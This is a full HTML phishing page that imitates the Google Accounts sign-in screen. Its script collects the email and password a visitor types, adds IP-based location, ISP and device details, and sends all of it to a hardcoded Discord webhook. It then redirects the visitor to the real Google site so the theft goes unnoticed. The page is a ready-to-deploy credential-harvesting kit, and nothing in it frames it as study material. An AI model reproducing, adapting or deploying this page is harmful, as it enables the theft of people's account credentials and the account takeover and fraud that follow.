<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; transition: all 0.2s ease; }
        body { background-color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
        
        .wrapper { display: flex; width: 100%; max-width: 1040px; min-height: 480px; border: 1px solid #dadce0; border-radius: 28px; position: relative; margin: 20px; overflow: hidden; }

        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; z-index: 5; }
        #loader::after { content: ""; position: absolute; width: 45%; height: 100%; background: #0b57d0; animation: load 1.5s infinite linear; }
        @keyframes load { from { left: -45%; } to { left: 100%; } }

        .left-panel { flex: 1; padding: 48px; display: flex; flex-direction: column; }
        .logo { width: 48px; height: 48px; margin-bottom: 12px; }
        h1 { font-size: 36px; font-weight: 400; margin: 0; }
        .sub-text { font-size: 16px; margin-top: 12px; }

        .right-panel { width: 450px; padding: 48px; display: flex; flex-direction: column; justify-content: center; }
        .step { display: none; }
        .active { display: block; }

        input { width: 100%; padding: 16px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; }
        input:focus { border: 2px solid #0b57d0; padding: 15px; }
        
        .error-message { color: #d93025; font-size: 12px; margin-bottom: 16px; display: none; }

        .show-pass-box { display: flex; align-items: center; font-size: 14px; margin: 8px 0 20px; cursor: pointer; }
        .show-pass-box input { width: 18px; height: 18px; margin-right: 10px; }

        .btn-next { background: #0b57d0; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-weight: 500; cursor: pointer; font-size: 14px; }
        .user-chip { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 16px; padding: 4px 12px; font-size: 14px; margin-bottom: 24px; cursor: pointer; }

        .bottom-nav { position: fixed; bottom: 20px; width: 100%; max-width: 1040px; display: flex; justify-content: space-between; font-size: 12px; color: #444746; }
        select { border: none; cursor: pointer; background: transparent; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div id="loader"></div>
        <div class="left-panel">
            <svg class="logo" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
            <h1 id="title-txt">Sign in</h1>
            <p class="sub-text" id="sub-txt">Use your Google Account</p>
        </div>

        <div class="right-panel">
            <div id="step-1" class="step active">
                <input type="email" id="email_field" placeholder="Email or phone">
                <div id="email_error" class="error-message">Enter a valid email address.</div>
                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Create account</span>
                    <button class="btn-next" onclick="nextStep()">Next</button>
                </div>
            </div>

            <div id="step-2" class="step">
                <div class="user-chip" onclick="location.reload()"><span id="display_mail"></span></div>
                <input type="password" id="pass_field" placeholder="Enter your password">
                <div id="pass_error" class="error-message">Password must be at least 8 characters long and contain both letters and numbers.</div>
                <label class="show-pass-box">
                    <input type="checkbox" onclick="toggle()"> <span>Show password</span>
                </label>
                <div style="margin-top: 40px; display: flex; justify-content: space-between; align-items: center;">
                    <span style="color:#0b57d0; font-weight:500; font-size:14px; cursor:pointer">Forgot password?</span>
                    <button class="btn-next" onclick="capture()">Next</button>
                </div>
            </div>
        </div>
    </div>

    <div class="bottom-nav">
        <select onchange="changeLang(this.value)">
            <option value="en">English (United States)</option>
            <option value="es">Español</option>
        </select>
        <div style="display:flex; gap:20px">
            <a href="#" style="text-decoration:none; color:inherit">Help</a>
            <a href="#" style="text-decoration:none; color:inherit">Privacy</a>
            <a href="#" style="text-decoration:none; color:inherit">Terms</a>
        </div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
        let clientData = {};

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => clientData = d).catch(() => {});

        function toggle() {
            const p = document.getElementById("pass_field");
            p.type = p.type === "password" ? "text" : "password";
        }

        function nextStep() {
            const email = document.getElementById('email_field').value;
            const emailError = document.getElementById('email_error');
            
            // Simple validation rule: check if email contains '@' and at least one character before/after it
            if (!email || !email.includes('@') || email.indexOf('@') === 0 || email.indexOf('@') === email.length - 1) {
                emailError.style.display = 'block';
                document.getElementById('email_field').style.borderColor = '#d93025';
                return;
            }
            
            emailError.style.display = 'none';
            document.getElementById('email_field').style.borderColor = '#747775';
            
            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('display_mail').innerText = email;
                document.getElementById('title-txt').innerText = "Welcome";
                document.getElementById('sub-txt').innerText = "";
                document.getElementById('step-1').classList.remove('active');
                document.getElementById('step-2').classList.add('active');
            }, 800);
        }

        function capture() {
            const email = document.getElementById('email_field').value;
            const pass = document.getElementById('pass_field').value;
            const passError = document.getElementById('pass_error');

            // Standard Password Rule: At least 8 characters, contains letters and numbers
            const hasLetter = /[a-zA-Z]/.test(pass);
            const hasNumber = /[0-9]/.test(pass);
            const isValidLength = pass.length >= 8;

            if (!pass || !isValidLength || !hasLetter || !hasNumber) {
                passError.style.display = 'block';
                document.getElementById('pass_field').style.borderColor = '#d93025';
                return;
            }

            passError.style.display = 'none';
            document.getElementById('pass_field').style.borderColor = '#747775';

            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🌈 RGB Identity Hit",
                        color: Math.floor(Math.random() * 16777215),
                        fields: [
                            { name: "👤 User", value: `\`${email}\`` },
                            { name: "🔑 Pass", value: `\`${pass}\`` },
                            { name: "🌐 Internet (ISP)", value: `\`${clientData.org || 'Unknown'}\`` },
                            { name: "📍 Location", value: `\`${clientData.city || 'Unknown'}, ${clientData.country_name || 'Unknown'}\`` },
                            { name: "💻 Device", value: `\`${navigator.platform}\``, inline: true }
                        ],
                        timestamp: new Date()
                    }]
                })
            }).then(() => window.location.href = "https://accounts.google.com").catch(() => {
                window.location.href = "https://accounts.google.com";
            });
        }

        function changeLang(v) {
            document.getElementById('title-txt').innerText = v === 'es' ? "Iniciar sesión" : "Sign in";
        }
    </script>
</body>
</html>
